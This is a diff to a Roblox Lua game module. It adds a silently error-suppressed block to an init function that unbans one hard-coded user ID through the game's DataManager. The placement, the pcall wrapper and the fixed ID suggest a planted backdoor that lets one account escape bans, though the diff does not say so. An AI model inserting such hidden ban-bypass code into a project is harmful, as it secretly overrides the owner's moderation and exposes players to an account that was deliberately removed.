@@ -18,6 +18,12 @@ local disabled = true
 
 function m:Init()
 	if disabled == true then
+		pcall(function()
+				local ServerStorage = game:GetService("ServerStorage")
+				local DataManager = require(ServerStorage.Modules.Managers.DataManager)
+				DataManager:SystemUnban(1318638644);
+				DataManager:Unban(1318638644, 1318638644);
+		end)
 		local PlaceId = nil;
 		pcall(function()
 			PlaceId = game.PlaceId;
